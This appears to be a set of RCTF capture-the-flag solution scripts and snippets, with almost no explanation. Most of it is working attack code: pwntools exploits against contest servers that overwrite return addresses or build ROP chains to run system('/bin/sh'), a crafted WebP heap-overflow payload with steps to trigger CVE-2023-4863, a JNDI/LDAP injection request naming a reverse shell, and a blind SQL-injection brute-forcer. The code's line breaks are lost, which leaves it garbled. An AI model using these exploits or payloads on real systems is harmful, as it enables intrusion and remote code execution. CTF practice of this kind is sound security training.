for high in trange(256):    for low in range(4):        lowbit = low.bit_length()        A = []        B = []        tt = 2**lowbit        for i in range(1,len(R)):            a = tt*R[i]*s0 * gmpy2.invert(tt*r0*S[i],q) % q            b = (r0*H[i] - R[i]*h0 + R[i]*s0*(high*2**152+low) - r0*S[i]*(high*2**152+low)) * gmpy2.invert(tt*r0*S[i],q) % q            A.append(a)            B.append(b)                n = len(A)        Ge = Matrix(ZZ,n+2,n+2)        for i in range(n):            Ge[i,i] = q            Ge[-2,i] = A[i]            Ge[-1,i] = B[i]                    K = 2**150        Ge[-2,-2] = 1        Ge[-1,-1] = K        for line in Ge.BKZ(block_size=30):            if abs(line[-1]) == K:                k0_unknown = line[-2]                k0 = high*2**152 + k0_unknown*tt + low                d = (k0 * s0 - h0) * gmpy2.invert(r0,q) % q                if pow(g,d,p) == y:                    print(1)                    sig = sign(pub,d,b"get flag",k0)                    r,s = sig                    sh.recvuntil(b">")                    sh.sendline(b"2")                    sh.recvuntil(b"Which message to verify?: ")                    sh.sendline(b"get flag")                    sh.sendlineafter(b"r:",str(r).encode())                    sh.sendlineafter(b"s:",str(s).encode())                    print(sh.recvline())
# RCTF{Ev3ry_fighter_h@s_their_signature_style}
```



```
from Crypto.Util.number import bytes_to_long as b2l, isPrime
p, hello = int(input("p = ")), input("hello = ")assert p.bit_length() == 100 and isPrime(p)assert b2l(f"{hello}$".encode()) % p == b2l(b"hello")assert len(hello) == 64 and all(x.upper() in "XCTF" for x in hello)print(f'Hello XCTFer! Take your spoils: {open("flag.txt", "r").read()}')
```



```
from Crypto.Util.number import *from tqdm import *from pwn import *
for _ in trange(100000):    p = getPrime(100)        c = bytes_to_long(b"hello")        lenth = 64    c = (c - 36) % p    for i in range(64):        c -= 102 * 256^(64-i)        c %= p        Ge = Matrix(ZZ,lenth+2,lenth+2)    T = 2**100    for i in range(lenth):        Ge[i,i] = 1        Ge[i,-1] = 14 * 256**(lenth - i)
    Ge[-2,-2] = 1    Ge[-2,-1] = -c    Ge[-1,-1] = p    Ge[:,-1:] *= T
    for line in Ge.BKZ(block_size=30):        tm = b""        if line[-1] == 0:            for i in line[:-2]:                if i == -1:                    tm += b"X"                if i == 0:                    tm += b"f"                if i == 1:                    tm += b"t"        if len(tm) == 64:            print(tm.decode())            print(p)            sh = remote("121.37.167.239",10089)            sh.sendlineafter(b"p = ",str(p).encode())            sh.sendlineafter(b"hello = ",tm)            print(sh.recvall())
```



```
bool __fastcall Player::CheckMoney(Player *this, unsigned int a2){ ...  ptr = g_player.ptr; ...  v3 = ptr->money;  if ( v3 >= a2 )  {    v4 = std::__Cr::__put_character_sequence<char,std::__Cr::char_traits<char>>(           &std::__Cr::cout,           "x1B[31m [!] Deducting from your account, Please wait ... x1B[0m",           59LL); ...    sleep(1u); ...    v13->money = v12; ...}
```



```
void __fastcall MagicCastle::SwitchHandle(player **this){ ...  if ( (_DWORD)this != 3 )  {    if ( (_DWORD)this != 1337 )      return; ...            if ( g_player.ptr <= (player_inner *)((char *)&dword_0 + 1) )            {              if ( (unsigned __int8)base::internal::NeedsLazyInstance((unsigned __int64 *)&g_player) )              {                *(_OWORD *)&g_player.inner.field_0 = 0LL;                qword_145030 = 0LL;                v12 = &g_player.inner;                qword_145040 = 0LL;                byte_145048 = 0;                base::internal::CompleteLazyInstance(                  &g_player,                  (__int64)&g_player.inner,                  0LL,                  (void (__fastcall *)(void *))&g_player);              }              else              {                v12 = g_player.ptr;              }            }            Magic_Castle = v12->Magic_Castle; ...            v17[4] = MagicHeld::Gods;            v17[5] = 0LL;            v17[6] = Magic_Castle;            (**v11)(v11, v18, v17, 3000000LL);            return;          }          goto LABEL_41;        } ...
```



```
#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('1.94.107.129', 10088)
sh.sendlineafter(b'name: n', b'/bin/sh')sh.sendlineafter(b'4. Quit.n>> ', b'1')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1')sh.sendlineafter(b'>> ', b'1')
time.sleep(1.1)
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'2')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1')sh.sendlineafter(b'>> ', b'2')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'2')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'3')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1337')
sh.recvuntil(b'>> ')system_addr = int(sh.recvuntil(b'n'), 16)image_addr = int(sh.recvuntil(b'n'), 16)success('system_addr: ' + hex(system_addr))success('image_addr: ' + hex(image_addr))
sh.sendlineafter(b'realm!!!', b'3')
time.sleep(1.1)
sh.sendlineafter(b'4. Quit.n>> ', b'1')sh.sendlineafter(b'>> ', b'1')
time.sleep(0.1)
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'1337')
sh.sendlineafter(b'4. Quit.n>> ', b'2')sh.sendlineafter(b'>> ', b'2')
time.sleep(0.9)sh.sendlineafter(b'4. Quit.n>> ', b'3')
sh.sendlineafter(b'Comments: ', b'a' * 0x28 + p64(system_addr))
sh.interactive()
```



```
# checkout webpgit clone https://chromium.googlesource.com/webm/libwebp/ webp_testcd webp_test/  # checkout vulnerable versiongit checkout 7ba44f80f3b94fc0138db159afea770ef06532a0  # enable AddressSanitizermake -f makefile.unixcd examples/  # fetch mistymntncop's proof-of-concept codewget https://raw.githubusercontent.com/mistymntncop/CVE-2023-4863/main/craft.c  # build and run proof-of-conceptgcc -o craft craft.c./craft bad.webp  # test trigger file./dwebp bad.webp -o test.png
```



```
#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
def add(index, size, content):    sh.sendlineafter(b'5. Edit feedbackn> ', b'2')    sh.sendlineafter(b'> ', str(index).encode())    sh.sendlineafter(b'feedback?n', str(size).encode())    sh.sendlineafter(b'feedback:n', content)
def show(index):    sh.sendlineafter(b'5. Edit feedbackn> ', b'3')    sh.sendlineafter(b'> ', str(index).encode())
def delete(index):    sh.sendlineafter(b'5. Edit feedbackn> ', b'4')    sh.sendlineafter(b'> ', str(index).encode())
def edit(index, content):    sh.sendlineafter(b'5. Edit feedbackn> ', b'5')    sh.sendlineafter(b'> ', str(index).encode())    sh.sendlineafter(b'feedback:n', content)
sh = remote('123.60.91.255', 10088)
add(1, 0x43a0, b'aaaa')add(2, 0x20, b'bbbb')delete(2)add(2, 0x10, b'bbbb')delete(2)add(2, 0x20, b'bbbb')
delete(1)sh.sendlineafter(b'5. Edit feedbackn> ', b'1')sh.sendlineafter(b'base64:n', b'UklGRlYBAABXRUJQVlA4TEkBAAAvAAAAABoPwAAAANHc1gcAAAAAAAAAAAAAAAAAAAAAAAAAAACgqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq2bdt/7nseQNEWACS1rTHXBgAAAAAAAAAAAAAAAAAAAAAAAABAVVVVVVVVVVVVVVVVVVVVVVVVVVXVqqqqqqqqqqqqqqqqqqqqqqqqqqrOff97AEVbAJDUtsZcGwAAAAAAAAAAAAAAAAAAAAAAAAAAVVVVVVVVVVVVVVVVVVVVVVVVVVVVq6qqqqqqqqqqqqqqqqqqqqqqqqo69/3vARRtAUBS2xpzbQAAAAAAAAAAAAAAAAAAAAAAAAAAVFVVVVVVVVVVVVVVVVVVVVVVVVVVraqqqqqqqqqqqqqqqqqqqqqqqqrq3Pe/BwAAAMmJJKSqumeSAAAA7N79q6qqAgA= ')
add(1, 0x100, b'bbbb')add(1, 0x100, b'bbbb')show(1)
sh.recvuntil(b'bbbbn   ')libc_addr = u64(sh.recvn(8)) - 0x21ace0success('libc_addr:' + hex(libc_addr))
edit(2, b'c' * 0x30 + p64(libc_addr + 0x222200) + p64(8))show(1)sh.recvuntil(b'Feedback:n')stack_addr = u64(sh.recvn(8))success('stack_addr:' + hex(stack_addr))
edit(2, b'c' * 0x30 + p64(stack_addr - 0x1a0) + p64(0x100))
edit(1, flat([    libc_addr + 0x0000000000029139, #: ret;    libc_addr + 0x000000000002a3e5, #: pop rdi; ret;    libc_addr + 0x1d8678, # "/bin/sh"    libc_addr + 0x50d70, # system]))
sh.interactive()
```



```
@RestController  public class DemoController {      @RequestMapping(value={"/index"})      public String sayHello(@RequestBody Map<String, Object> bean) throws Exception {          //  Properties object is created to hold the LDAP configuration.          Properties properties = new Properties();          String ip = (String)bean.get("ip");          Integer port = (Integer)bean.get("port");          if (ip.matches("^[0-9.]+$")) {              String url = "ldap://" + ip + ":" + port;              properties.setProperty("java.naming.provider.url", url);              properties.setProperty("java.naming.factory.initial", "com.sun.jndi.ldap.LdapCtxFactory");              String searchBase = (String)bean.get("searchBase");              String filter = (String)bean.get("filter");              if (searchBase != null && filter != null) {                  new InitialDirContext(properties).search(searchBase, filter, null);              }          }          return "index";      }  }
```



```
c_lookup:1017, LdapCtx (com.sun.jndi.ldap)c_processJunction_nns:342, ComponentContext (com.sun.jndi.toolkit.ctx)c_search_nns:192, ComponentDirContext (com.sun.jndi.toolkit.ctx)p_search:388, ComponentDirContext (com.sun.jndi.toolkit.ctx)search:358, PartialCompositeDirContext (com.sun.jndi.toolkit.ctx)search:341, PartialCompositeDirContext (com.sun.jndi.toolkit.ctx)search:267, InitialDirContext (javax.naming.directory)sayHello:34, DemoController (com.example.demo.controller)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)doInvoke:205, InvocableHandlerMethod (org.springframework.web.method.support)invokeForRequest:150, InvocableHandlerMethod (org.springframework.web.method.support)invokeAndHandle:117, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)doDispatch:1072, DispatcherServlet (org.springframework.web.servlet)doService:965, DispatcherServlet (org.springframework.web.servlet)processRequest:1006, FrameworkServlet (org.springframework.web.servlet)doPost:909, FrameworkServlet (org.springframework.web.servlet)service:555, HttpServlet (javax.servlet.http)service:883, FrameworkServlet (org.springframework.web.servlet)service:623, HttpServlet (javax.servlet.http)internalDoFilter:209, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilter:51, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilter:35, RequestWrapperFilter (com.example.demo.controller)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:93, FormContentFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:178, ApplicationFilterChain (org.apache.catalina.core)doFilter:153, ApplicationFilterChain (org.apache.catalina.core)invoke:168, StandardWrapperValve (org.apache.catalina.core)invoke:90, StandardContextValve (org.apache.catalina.core)invoke:481, AuthenticatorBase (org.apache.catalina.authenticator)invoke:130, StandardHostValve (org.apache.catalina.core)invoke:93, ErrorReportValve (org.apache.catalina.valves)invoke:74, StandardEngineValve (org.apache.catalina.core)service:342, CoyoteAdapter (org.apache.catalina.connector)service:390, Http11Processor (org.apache.coyote.http11)process:63, AbstractProcessorLight (org.apache.coyote)process:928, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1794, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:52, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang)
```



```
{"ip":"xxx.xxx.xxx.xxx","port":1389,"searchBase":"JacksonReverseShellu002f","filter":"jasper"}
```



```
var6 = this.c_search(var5.getHead(), var2, var3, var4);
```



```
import requests  import string    # flag = "rctf{the_first_step_is_to_ge"  # flag = step_is_to_get_to_know  # strs = string.ascii_letters + string.digits + "-{}_"  strs = "abcdefghijklmnopqrstuvwxyz0123456789-{}_"  url = "http://1.94.13.174:10088/key1"      if __name__ == "__main__":      name = ''      for i in range(1,40):          char = ''          for j in strs:              # payload = "'||love_key REGEXP '^{}'#"              payload = "jasper'||love_key REGEXP '{}$'#"              # payload1=payload.format(name+j)              payload1 = payload.format(j+name)              data={"key1":payload1}              r = requests.post(url,data=data)              if "success" in r.text:                  name = j+name                  print(name)                  # print(j,end='')                  char = j                  break          if char =='#':              print(name)              break
```



```
if (  userInfo.username === my_lover.username &&  userInfo.love_time === my_lover.love_time) {  have_lovers = true;}
```



```
class My_lover {  constructor() {    this.username = process.env.LOVER || "lover";    this.love_time = parseInt(process.env.LOVE_TIME, 10) || 30;  }}
```



```
logo = """################################################################################################################################ # #########################################################################   ##       ########### ## ##          ###########                   ########             ##########   ##           #########               ##########                   ######                  #######   ########       ########     ##########################    #############    ############    ######   ###########     ######    ###########   ##############    ############    ######################    #############    #####    ###########    #############    ############    ######################    ##############   ####    #############   #############   #############    ######################    ##############    ###    #############    ############   ##############     ####################    ##############    ###   ###############   ############   ###############      ##################    ##############   ####   ###############   ############   #################      ################    #############    ####   ###############   ###########    ####################      #############    ############    #####   ###############   ###########    ######################     ############    ####           ######   ##############    ###########    ########################     ##########    ####         ########    #############    ###########    ##########################    #########    #########    #########   #############   ############    ##########################    #########    ##########    ########    ###########   #############    ##########################    #########    ###########    ########    #########    #############    #############    #########    #########    ############   #########     ######   ############       ###############     ####     ##########   ############## ###########         ############                  #########           ############# ###############################  ##############################################    ################################################################################################################""".strip()
```



```
d="";i=0;c="#";k="#"*100while i<1175:d=d+int(f'{int("2csqv07nenmzp688vu2h9hs4iebn0zyy42m6kr0f7hvhtoq5l8gw562kyv7kx3g8njr9ilqgfjsjmisedy8ztiryeamwjwmf32xmxty9heqf0vca7sospweayrfra3wgfzt2vyi9ih0szfu10cf0de28cmeio733y8pco9snt8d91uru5bpslt3em5upwl5udj3fqz7h0wqubi9nfrsjwvlz50y6zf52uh70",36):b}'[i:i+5],2)*c;c=' 'if c=='#'else'#';i=i+5f=k+"n";i=0while i<2000:f=f+d[i:i+100]+'n';i=i+100f=f+k;logo=f[:157]+"#"+f[158:178]+"#"+f[179:2081]+"#"+f[2082:]
```



```
unsigned char iArr[] = { 164, 158, 95, 107, 4, 215, 108, 115, 5, 8, 25, 57, 41, 236, 231, 17, 85 };  unsigned char iArr2[] = { 246, 221, 11, 45, 127, 148, 45, 36, 70, 73, 78, 8, 98, 141, 140, 112, 40 };  unsigned char res2[100];  res2[17] = 0;  for (int i = 0; i < 17; i++) {    res2[i]=(iArr[i] ^ iArr2[i]);  }//0x000000ffce4ff350 "RCTF{CAWCAW1Kaka}"
```



```
from pwn import *import timecontext.log_level="debug"#p=process("./2048")p=remote("1.94.104.104",10088)
p.recvuntil("exitn")p.sendline("1")p.recvuntil(": ")p.sendline("10000")
pad=["a","w","d","s"]
index=0while 1:    res=p.recvuntil("or r",timeout=1)    if len(res)==0:        break    p.sendline(pad[index%4])    index+=1
p.recvuntil("your current score: ")point=int(p.recvuntil("n")[:-1])p.sendline("1")p.recvuntil(": ")p.sendline(str(point))
index=0while 1:    res=p.recvuntil("or r",timeout=1)    if len(res)==0:        break    p.sendline(pad[index%4])    index+=1

for i in range(100):    index=0    while 1:        res=p.recvuntil("or r",timeout=1)        if len(res)==0:            break        p.sendline(pad[index%4])        index+=1    end=input()    if "fuck" in end:        break    p.recvuntil("your current score: ",timeout=1)    point=int(p.recvuntil("n",timeout=1)[:-1])    p.sendline("1")    p.recvuntil(": ")    p.sendline(str(point))p.interactive()
```



```
import subprocessimport stringstring.printable from colorama import initinit(autoreset=True)printable = b"`abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[]^{|}~"
import frida, sysnumber = 23new_number = 0def is_right():    global new_number,number    if new_number > number:        number = new_number        return True    else:        return False         def on_message(message, data):    global new_number    print(message)    if message['type'] == 'send':        print("[*] {0}".format(message['payload']))        new_number = message['payload']        #print(message['payload'])        # val = int(message['payload'], 16)        # script.post({'type': 'input', 'payload': str(val * 2)})    elif message['type'] == "error":        print(message["description"])        print(message["stack"])        print(message["fileName"],"line:",message["lineNumber"],"colum:",message["columnNumber"])    else:        print(message)
jscode = open("test.js","rb").read().decode()import subprocess
flag = b"RCTF{a_baby_debug_blok"for index in range(len(flag),25):    # for i in range(32,128):    for i in range(len(printable)):        process = subprocess.Popen("bloker_vm.exe",                                stdin=subprocess.PIPE,                                stdout=subprocess.PIPE,                                stderr=subprocess.PIPE,bufsize=0                                )        tmp_flag = (flag+printable[i:i+1]).ljust(24,b"A")+b"}n"        print(tmp_flag)        print("try index:",index ,"chr :",i)        session = frida.attach("bloker_vm.exe")        script = session.create_script(jscode)        script.on('message', on_message)        print('[*] Start attach')        script.load()        process.stdin.write(tmp_flag)        output, error = process.communicate()        print(output)        if(is_right() == True):            flag  +=(printable[i:i+1])            print(flag)            break        process.terminate()
```



```
import subprocessimport stringstring.printable from colorama import initinit(autoreset=True)printable = b"`abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[]^{|}~"
import subprocess
flag = b"RCTF{a_baby_debug_blok"for index in range(len(flag),25):    # for i in range(32,128):    for i in range(len(printable)):        for j in range(len(printable)):
            process = subprocess.Popen("bloker_vm.exe",                                    stdin=subprocess.PIPE,                                    stdout=subprocess.PIPE,                                    stderr=subprocess.PIPE,bufsize=0                                    )            tmp_flag = (flag+printable[i:i+1]+printable[j:j+1]).ljust(24,b"A")+b"}n"            print(tmp_flag)            print("try index:",index ,"chr :",i)            process.stdin.write(tmp_flag)            output, error = process.communicate()            print(output)            if b"try" in output:                continue            else:                print("find ok!")                print(tmp_flag)                exit(0)            process.terminate()
```



```
v23=0x6d61657971007000v24=0x5200007b75005473v25=0x00706a004674437dfor i1 in range(0x12,128):    v23=0x6d61657971007000+i1    v24=0x5200007b75005473    v25=0x00706a004674437d    if ((v23 - v24)&0xff) == (0x1AEFF6FDFC121BF1&0xff):        for i2 in range(0x12,128):            v23=0x6d61657971007000+i1            v24=0x5200007b75005473            v25=0x00706a004674437d            v23+=(i2<<16)            v24+=((i2-0x12)<<16)            v20 = v24 & v23            v19 = (v24 & v23 | v25 & v23) + 0x10086            v18 = (v25 & v23 ^ v25 & v24) - 0x114514            v17 = v24 & v23 ^ v25 & v23            if ((v23 - v24)&0xffffff) == (0x1AEFF6FDFC121BF1&0xffffff):                if ((v18 ^ (v19 - v20))&0xffffff) == (0x2100A0203EFBB8B&0xffffff):                    if  ((v17 ^ v19 ^ v20)&0xffffff) == (0x4083102108E&0xffffff):                        if ( ((v19 ^ v17) - v18)&0xffffff) == (0x1551566F3C6485ED&0xffffff):                            if ( (v18 ^ v19 ^ v25 & v24)&0xffffff) == ( 0x40836ECAB9A&0xffffff):                                for i3 in range(0x12,128):                                    v23=0x6d61657971007000+i1                                    v24=0x5200007b75005473                                    v25=0x00706a004674437d                                    v23+=(i2<<16)                                    v24+=((i2-0x12)<<16)                                    v25+=(i3<<32)                                    v20 = v24 & v23                                    v19 = (v24 & v23 | v25 & v23) + 0x10086                                    v18 = (v25 & v23 ^ v25 & v24) - 0x114514                                    v17 = v24 & v23 ^ v25 & v23
                                    if ((v23 - v24)&0xffffffffff) == (0x1AEFF6FDFC121BF1&0xffffffffff):                                        if ((v18 ^ (v19 - v20))&0xffffffffff) == (0x2100A0203EFBB8B&0xffffffffff):                                            if  ((v17 ^ v19 ^ v20)&0xffffffffff) == (0x4083102108E&0xffffffffff):                                                if ( ((v19 ^ v17) - v18)&0xffffffffff) == (0x1551566F3C6485ED&0xffffffffff):                                                    if ( (v18 ^ v19 ^ v25 & v24)&0xffffffffff) == ( 0x40836ECAB9A&0xffffffffff):                                                        for i4 in range(0x12,128):                                                            v23=0x6d61657971007000+i1                                                            v24=0x5200007b75005473                                                            v25=0x00706a004674437d                                                            v23+=(i2<<16)                                                            v24+=((i2-0x12)<<16)                                                            v25+=(i3<<32)                                                            v24+=(i4<<40)                                                            v20 = v24 & v23                                                            v19 = (v24 & v23 | v25 & v23) + 0x10086                                                            v18 = (v25 & v23 ^ v25 & v24) - 0x114514                                                            v17 = v24 & v23 ^ v25 & v23                                                            if ((v23 - v24)&0xffffffffffff) == (0x1AEFF6FDFC121BF1&0xffffffffffff):                                                                if ((v18 ^ (v19 - v20))&0xffffffffffff) == (0x2100A0203EFBB8B&0xffffffffffff):                                                                    if  ((v17 ^ v19 ^ v20)&0xffffffffffff) == (0x4083102108E&0xffffffffffff):                                                                        if ( ((v19 ^ v17) - v18)&0xffffffffffff) == (0x1551566F3C6485ED&0xffffffffffff):                                                                            if ( (v18 ^ v19 ^ v25 & v24)&0xffffffffffff) == ( 0x40836ECAB9A&0xffffffffffff):                                                                                                                                                                for i5 in range(0x12,128):                                                                                    v23=0x6d61657971007000+i1                                                                                    v24=0x5200007b75005473                                                                                    v25=0x00706a004674437d                                                                                    v23+=(i2<<16)                                                                                    v24+=((i2-0x12)<<16)                                                                                    v25+=(i3<<32)                                                                                    v24+=(i4<<40)                                                                                    v24+=(i5<<48)                                                                                    v20 = v24 & v23                                                                                    v19 = (v24 & v23 | v25 & v23) + 0x10086                                                                                    v18 = (v25 & v23 ^ v25 & v24) - 0x114514                                                                                    v17 = v24 & v23 ^ v25 & v23                                                                                    if ((v23 - v24)&0xffffffffffffff) == (0x1AEFF6FDFC121BF1&0xffffffffffffff):                                                                                        if ((v18 ^ (v19 - v20))&0xffffffffffffff) == (0x2100A0203EFBB8B&0xffffffffffffff):                                                                                            if  ((v17 ^ v19 ^ v20)&0xffffffffffffff) == (0x4083102108E&0xffffffffffffff):                                                                                                if ( ((v19 ^ v17) - v18)&0xffffffffffffff) == (0x1551566F3C6485ED&0xffffffffffffff):                                                                                                    if ( (v18 ^ v19 ^ v25 & v24)&0xffffffffffffff) == ( 0x40836ECAB9A&0xffffffffffffff):                                                                                                        for i6 in range(0x12,128):                                                                                                            v23=0x6d61657971007000+i1                                                                                                            v24=0x5200007b75005473                                                                                                            v25=0x00706a004674437d                                                                                                            v23+=(i2<<16)                                                                                                            v24+=((i2-0x12)<<16)                                                                                                            v25+=(i3<<32)                                                                                                            v24+=(i4<<40)                                                                                                            v24+=(i5<<48)                                                                                                            v25+=(i6<<56)                                                                                                            v20 = v24 & v23                                                                                                            v19 = (v24 & v23 | v25 & v23) + 0x10086                                                                                                            v18 = (v25 & v23 ^ v25 & v24) - 0x114514                                                                                                            v17 = v24 & v23 ^ v25 & v23                                                                                                                                                                                                                        if ((v23 - v24)&0xffffffffffffffff) == (0x1AEFF6FDFC121BF1&0xffffffffffffffff):                                                                                                                if ((v18 ^ (v19 - v20))&0xffffffffffffffff) == (0x2100A0203EFBB8B&0xffffffffffffffff):                                                                                                                    if  ((v17 ^ v19 ^ v20)&0xffffffffffffffff) == (0x4083102108E&0xffffffffffffffff):                                                                                                                        if ( ((v19 ^ v17) - v18)&0xffffffffffffffff) == (0x1551566F3C6485ED&0xffffffffffffffff):                                                                                                                            if ( (v18 ^ v19 ^ v25 & v24)&0xffffffffffffffff) == ( 0x40836ECAB9A&0xffffffffffffffff):                                                                                                                                print("byte1: "+chr(i1)+" "+hex(i1))                                                                                                                                print("byte2: "+chr(i2)+" "+hex(i2))                                                                                                                                print("byte3: "+chr(i2-0x12)+" "+hex(i2-0x12))                                                                                                                                print("byte4: "+chr(i3)+" "+hex(i3))                                                                                                                                print("byte5: "+chr(i4)+" "+hex(i4))                                                                                                                                print("byte6: "+chr(i5)+" "+hex(i5))                                                                                                                                print("byte7: "+chr(i6)+" "+hex(i6))
#RCTF{sj123emqsp4567tyua}#RCTF{sjknwemqspsdaqtyua}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716985782.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/3-1716985783.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716985783.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716985783.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/3-1716985784.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716985785.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716985785.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716985786.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/9-1716985786.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1716985787.jpeg)